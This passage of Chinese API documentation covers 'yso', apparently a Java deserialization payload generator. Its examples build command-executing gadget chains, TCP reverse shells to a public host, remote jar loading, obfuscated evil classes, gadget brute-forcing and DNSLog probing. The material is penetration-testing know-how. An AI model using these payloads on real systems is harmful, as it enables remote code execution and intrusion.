options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
yso.GenerateSleepClassObject(yso.useSleepTime(5))
```


#### 定义

`GenerateSleepClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### GenerateSpringEchoEvilClassObject

#### 详细描述
GenerateSpringEchoEvilClassObject 生成一个使用SpringEcho类模板的javaclassparser.ClassObject对象，

这个函数结合使用 useSpringEchoTemplate 和 springParam 函数， 以生成在反序列化时会回显指定内容的Java对象。

options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
classObject, err := yso.GenerateSpringEchoEvilClassObject(yso.springHeader("Echo","Echo Check")) // 生成并配置SpringEcho Java对象
```


#### 定义

`GenerateSpringEchoEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### GenerateTcpReverseEvilClassObject

#### 详细描述
GenTcpReverseClassObject

GenerateTcpReverseEvilClassObject 生成一个使用TcpReverse类模板的javaclassparser.ClassObject对象，

这个函数结合使用 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 函数， 以生成在反序列化时会反连指定的 tcpReverseHost ，tcpReversePort 的Java对象。

host：要设置的 tcpReverseHost 的host。

port：要设置的 tcpReversePort 的port。

options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
host = "公网IP"
token = uuid()
classObject, err := yso.GenerateTcpReverseEvilClassObject(host,8080,yso.tcpReverseToken(token),additionalOptions...) // 生成并配置TcpReverse Java对象
```


#### 定义

`GenerateTcpReverseEvilClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| host | `string` |   |
| port | `int` |   |
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### GenerateTcpReverseShellEvilClassObject

#### 详细描述
GenTcpReverseShellClassObject

GenerateTcpReverseShellEvilClassObject 生成一个使用TcpReverseShell类模板的javaclassparser.ClassObject对象，

这个函数结合使用 useTcpReverseShellTemplate ，tcpReverseShellHost ，tcpReverseShellPort 函数， 以生成在反序列化时会反连指定的 tcpReverseShellHost ，tcpReverseShellPort 的Java对象。

host：要设置的 tcpReverseShellHost 的host。

port：要设置的 tcpReverseShellPort 的port。

options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
host = "公网IP"
classObject, err := yso.GenerateTcpReverseShellEvilClassObject(host,8080,additionalOptions...) // 生成并配置TcpReverseShell Java对象
```


#### 定义

`GenerateTcpReverseShellEvilClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| host | `string` |   |
| port | `int` |   |
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### GenerateTomcatEchoClassObject

#### 详细描述
GenTomcatEchoClassObject

GenerateTomcatEchoEvilClassObject 生成一个使用TomcatEcho类模板的javaclassparser.ClassObject对象，

options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
body 回显
bodyClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))
header 回显
headerClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
```


#### 定义

`GenerateTomcatEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### GetAllGadget

#### 详细描述
GetAllGadget 获取所有支持的Java反序列化Gadget。

这个函数会遍历所有已配置的Gadget，并为每个Gadget创建对应的生成函数。

对于支持模板实现的Gadget，会创建一个接受GenClassOptionFun参数的函数；

对于不支持模板实现的Gadget，会创建一个接受命令字符串参数的函数。

返回：包含所有Gadget生成函数的接口切片。

Example:
```
allGadgets := yso.GetAllGadget()

	for _, gadget := range allGadgets {
	    switch g := gadget.(type) {
	    case func(...GenClassOptionFun) (*JavaObject, error):
	        // 处理模板实现的Gadget
	        obj, err := g(yso.useRuntimeExecEvilClass("whoami"))
	    case func(string) (*JavaObject, error):
	        // 处理命令执行类型的Gadget
	        obj, err := g("whoami")
	    }
	}

```


#### 定义

`GetAllGadget() []any`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `[]any` |   |


### GetAllRuntimeExecGadget

#### 详细描述
GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget，可用于爆破 gadget

Example:
```

	command := "whoami" // 假设的命令字符串
	for _, gadget := range yso.GetAllRuntimeExecGadget() {
		javaObj, err := gadget(command)
		if javaObj == nil || err != nil {
			continue
		}
		objBytes, err := yso.ToBytes(javaObj)
		if err != nil {
			continue
		}
		// 发送 objBytes
	}

```


#### 定义

`GetAllRuntimeExecGadget() []RuntimeExecGadget`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `[]RuntimeExecGadget` |   |


### GetAllTemplatesGadget

#### 详细描述
GetAllTemplatesGadget 获取所有支持模板的Gadget，可用于爆破 gadget

Example:
```

	for _, gadget := range yso.GetAllTemplatesGadget() {
		domain := "xxx.dnslog" // dnslog 地址
		javaObj, err := gadget(yso.useDNSLogEvilClass(domain))
		if javaObj == nil || err != nil {
			continue
		}
		objBytes, err := yso.ToBytes(javaObj)
		if err != nil {
			continue
		}
		// 发送 objBytes
	}

```


#### 定义

`GetAllTemplatesGadget() []TemplatesGadget`

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `[]TemplatesGadget` |   |


### GetBeanShell1JavaObject

#### 详细描述
GetBeanShell1JavaObject 基于BeanShell1 序列化模板生成并返回一个Java对象。

它首先解析预定义的BeanShell1序列化模板，然后在解析出的第一个Java对象中替换预设的占位符为传入的命令字符串。

cmd：要传入Java对象的命令字符串。

返回：成功时返回修改后的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command := "ls" // 假设的命令字符串
javaObject, err := yso.GetBeanShell1JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```


#### 定义

`GetBeanShell1JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetClick1JavaObject

#### 详细描述
GetClick1JavaObject 基于Click1 序列化模板生成并返回一个Java对象。

用户可以通过可变参数`options`提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数允许用户定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetClick1JavaObject(

	yso.useRuntimeExecEvilClass(command),
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className),
	)

```


#### 定义

`GetClick1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsBeanutils183NOCCJavaObject

#### 详细描述
GetCommonsBeanutils183NOCCJavaObject 基于Commons Beanutils 1.8.3 序列化模板生成并返回一个Java对象。

去除了对 commons-collections:3.1 的依赖。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsBeanutils183NOCCJavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```


#### 定义

`GetCommonsBeanutils183NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsBeanutils192NOCCJavaObject

#### 详细描述
GetCommonsBeanutils192NOCCJavaObject 基于Commons Beanutils 1.9.2 序列化模板生成并返回一个Java对象。

去除了对 commons-collections:3.1 的依赖。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsBeanutils192NOCCJavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```


#### 定义

`GetCommonsBeanutils192NOCCJavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsBeanutils1JavaObject

#### 详细描述
GetCommonsBeanutils1JavaObject 基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(

	 yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
		yso.obfuscationClassConstantPool(),
		yso.evilClassName(className), // 指定恶意类的名称

)
```


#### 定义

`GetCommonsBeanutils1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsCollections1JavaObject

#### 详细描述
GetCommonsCollections1JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

cmd：要设置在Java对象中的命令字符串。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command := "ls" // 假设的命令字符串
javaObject, err := yso.GetCommonsCollections1JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```


#### 定义

`GetCommonsCollections1JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsCollections2JavaObject

#### 详细描述
GetCommonsCollections2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollections2JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```


#### 定义

`GetCommonsCollections2JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsCollections3JavaObject

#### 详细描述
GetCommonsCollections3JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollections3JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```


#### 定义

`GetCommonsCollections3JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsCollections4JavaObject

#### 详细描述
GetCommonsCollections4JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollections4JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```


#### 定义

`GetCommonsCollections4JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsCollections5JavaObject

#### 详细描述
GetCommonsCollections5JavaObject 基于Commons Collections 2 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

cmd：要设置在Java对象中的命令字符串。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollections5JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```


#### 定义

`GetCommonsCollections5JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsCollections6JavaObject

#### 详细描述
GetCommonsCollections6JavaObject 基于Commons Collections 6 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

cmd：要设置在Java对象中的命令字符串。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollections6JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```


#### 定义

`GetCommonsCollections6JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsCollections7JavaObject

#### 详细描述
GetCommonsCollections7JavaObject 基于Commons Collections 7 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

cmd：要设置在Java对象中的命令字符串。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollections7JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```


#### 定义

`GetCommonsCollections7JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsCollections8JavaObject

#### 详细描述
GetCommonsCollections8JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollections8JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```


#### 定义

`GetCommonsCollections8JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsCollectionsK1JavaObject

#### 详细描述
GetCommonsCollectionsK1JavaObject 基于Commons Collections &lt;=3.2.1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollectionsK1JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```


#### 定义

`GetCommonsCollectionsK1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsCollectionsK2JavaObject

#### 详细描述
GetCommonsCollectionsK2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetCommonsCollectionsK2JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```


#### 定义

`GetCommonsCollectionsK2JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsCollectionsK3JavaObject

#### 详细描述
GetCommonsCollectionsK3JavaObject 基于Commons Collections K3 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

cmd：要设置在Java对象中的命令字符串。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollectionsK3JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```


#### 定义

`GetCommonsCollectionsK3JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetCommonsCollectionsK4JavaObject

#### 详细描述
GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

cmd：要设置在Java对象中的命令字符串。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetCommonsCollectionsK4JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```


#### 定义

`GetCommonsCollectionsK4JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetFindGadgetByDNSJavaObject

#### 详细描述
GetFindGadgetByDNSJavaObject 通过 DNSLOG 探测 CLass Name，进而探测 Gadget。

使用预定义的FindGadgetByDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。

url：要在生成的Java对象中设置的URL字符串。

返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
url, token, _ = risk.NewDNSLogDomain()
javaObject, _ = yso.GetFindGadgetByDNSJavaObject(url)
gadgetBytes,_ = yso.ToBytes(javaObject)
使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
res,err = risk.CheckDNSLogByToken(token)

	if err {
	  //dnslog查询失败
	} else {
	  if len(res) > 0{
	   // dnslog查询成功
	  }
	}

```


#### 定义

`GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| url | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetGadget

#### 详细描述
GenerateGadget this is a highly flexible function that can generate a Java object by three different ways:

 1. Generate a Java object that have no any params.

    Example: GenerateGadget("CommonsCollections1")
 2. Generate a Java object that have one param and implement by TemplateImpl, the first param is the name of the gadget, the second param is the class name, the third param is the class param.
    Example: GenerateGadget("CommonsCollections2", "Sleep", "1000")
 3. Generate a Java object that have multiple params and implement by TemplateImpl, the first param is the name of the gadget, the second param is the class name, the third param is the class param map.
    Example: GenerateGadget("CommonsCollections2", "TcpReverseShell", map[string]string{"host": "127.0.0.1","port":"8080"})
 4. Generate a Java object that have one param and implement by TransformChain, the first param is the name of the gadget, the second param is the transform chain name, the third param is the param.
    Example: GenerateGadget("CommonsCollections1", "dnslog", "xxx.xx.com")
 5. Generate a Java object that have multiple params and implement by TransformChain, the first param is the name of the gadget, the second param is the transform chain name, the third param is the param map.
    Example: GenerateGadget("CommonsCollections1", "loadjar", map[string]string{"url": "xxx.com", "name": "exp"})
 6. Generate a Java object that implement by TemplateImpl.
    Example: GenerateGadget("CommonsCollections2", useRuntimeExecEvilClass("whoami"))


#### 定义

`GetGadget(name string, opts ...any) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| name | `string` |   |
| opts | `...any` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetGadgetNameByFun

#### 详细描述
GetGadgetNameByFun 从函数指针获取 gadget 名称，通过解析函数名来提取。

函数名需要符合 &#34;Get*JavaObject&#34; 格式，返回中间的 * 部分作为 gadget 名称

Example:
```
name, err := GetGadgetNameByFun(GetCommonsBeanutils1JavaObject)
// name = "CommonsBeanutils1"
```


#### 定义

`GetGadgetNameByFun(i any) (string, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| i | `any` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `string` |   |
| r2 | `error` |   |


### GetGroovy1JavaObject

#### 详细描述
GetGroovy1JavaObject 基于Groovy1 序列化模板生成并返回一个Java对象。

这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。

cmd：要设置在Java对象中的命令字符串。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command := "ls" // 假设的命令字符串
javaObject, _ = yso.GetGroovy1JavaObject(command)
gadgetBytes,_ = yso.ToBytes(javaObject)
hexPayload = codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```


#### 定义

`GetGroovy1JavaObject(cmd string) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetJBossInterceptors1JavaObject

#### 详细描述
GetJBossInterceptors1JavaObject 基于JBossInterceptors1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJBossInterceptors1JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```


#### 定义

`GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*JavaObject` |   |
| r2 | `error` |   |


### GetJSON1JavaObject

#### 详细描述
GetJSON1JavaObject 基于JSON1 序列化模板生成并返回一个Java对象。

通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。

这些函数使用户能够定制生成的Java对象的特定属性或行为。

options：用于配置Java对象的可变参数函数列表。

返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。

Example:
```
command = "whoami"
className = "KEsBXTRS"
gadgetObj,err = yso.GetJSON1JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```


#### 定义

`GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)`

#### 参数
